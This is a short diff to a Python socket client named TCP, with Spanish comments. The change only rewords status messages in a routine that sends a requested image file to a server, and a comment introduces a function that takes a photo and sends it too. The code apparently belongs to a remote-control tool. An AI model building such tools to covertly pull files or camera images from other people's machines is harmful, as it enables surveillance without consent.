@@ -401,20 +401,20 @@ class TCP:
             imagen = params['-i']
 
         if os.path.isfile(imagen) and self.isImage(imagen):
-            self.__sock.send("ok".encode())
+            self.__sock.send("[+] info: ok".encode())
             
-            ok = self.__sock.recv(8)
+            self.__sock.recv(8)
             nombre = self.getNombre(imagen)
             self.__sock.send(nombre.encode())
 
-            ok = self.__sock.recv(8)
+            self.__sock.recv(8)
             archivo = open(imagen, 'rb')
             info = archivo.read()
             archivo.close()
             self.enviarDatos(info)
 
         else:
-            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
+            self.__sock.send(f"[!] warning: Imagen \"{imagen}\" no encontrada".encode())
 
     # Funcion para tomar una foto y enviarla al servidor
     # cmd --> comando recibido
